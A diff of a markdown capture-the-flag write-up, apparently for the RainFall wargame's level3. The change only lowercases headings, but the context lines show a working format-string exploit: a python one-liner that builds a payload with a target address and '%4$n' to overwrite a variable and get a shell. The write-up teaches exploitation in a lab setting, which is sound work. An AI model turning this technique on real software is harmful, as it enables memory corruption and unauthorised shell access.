@@ -1,6 +1,6 @@
-# Level3
+# level3
 
-## Exploring the binary
+## exploring the binary
 ```shell
 level3@RainFall:~$ ./level3
 phantom
@@ -102,7 +102,7 @@ AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
 ```
 We found success with just 5 addresses and discovered that the string <code>AAAA</code> resides in the fourth position. With our understanding of the format string's location in the stack, our next step is to craft a string 64 characters in length, embedding the address of the variable (<code>0x0804988c</code>) crucial for triggering the shell. Subsequently, we leverage the <code>%n</code> specifier to write this length to the specified address - when the format string <code>%4$n</code> is used, printf will write the number of characters printed so far into the memory location specified by the fourth argument.
 
-## Exploit
+## exploit
 ``` shell
 level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "F"*60 + "%4$n"' > /tmp/flag3
 level3@RainFall:~$ cat /tmp/flag3 - | ./level3
